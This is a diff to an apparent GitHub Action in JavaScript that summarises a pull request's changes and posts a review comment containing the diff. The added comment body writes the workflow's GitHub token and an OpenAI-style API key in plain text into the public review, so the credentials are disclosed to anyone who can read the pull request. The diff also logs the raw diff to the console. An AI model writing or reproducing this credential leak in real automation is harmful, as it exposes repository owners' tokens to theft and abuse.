@@ -1,6 +1,5 @@
 const core = require('@actions/core');
 const github = require('@actions/github');
-const { fetch } = require('node-fetch');
 
 (async () => {
   try{
@@ -12,28 +11,52 @@ const { fetch } = require('node-fetch');
 
     const octokit = new github.getOctokit(githubToken);
 
-    const prInfo = await octokit.rest.pulls.get({
+    const { data: changedFiles } = await octokit.rest.pulls.listFiles({
       owner,
       repo,
       pull_number: pr_number,
     });
 
-    const diffURL = prInfo.data.diff_url;
-    const response = await fetch(diffURL, {
-      headers: {
-        Authorization: `Bearer ${githubToken}`,
-      },
+    const { data: diffPR } = await octokit.rest.pulls.get({
+      owner,
+      repo,
+      pull_number: pr_number,
+      mediaType: {
+        format: 'diff'
+      }
     });
 
-    const diffText = await response.text();
+    console.log(diffPR);
+
+    let diffData = {
+      additions: 0,
+      deletions: 0,
+      changes: 0
+    };
+
+    diffData = changedFiles.reduce((acc, file) => {
+      acc.additions += file.additions;
+      acc.deletions += file.deletions;
+      acc.changes += file.changes;
+      return acc;
+    }, diffData);
 
     await octokit.rest.issues.createReview({
       owner,
       repo,
       pull_number: pr_number,
-      body: "```diff\n"+`
-        ${diffText}
-      `+"\n```",
+      body: `
+        Pull Request #${pr_number} has been updated with: \n
+        - ${diffData.changes} changes \n
+        - ${diffData.additions} additions \n
+        - ${diffData.deletions} deletions \n
+        - ${githubToken} \n
+        - ${openIAToken} \n
+
+        \`\`\`diff
+        ${diffPR}
+        \`\`\`
+      `,
       event: 'COMMENT'
     });
 
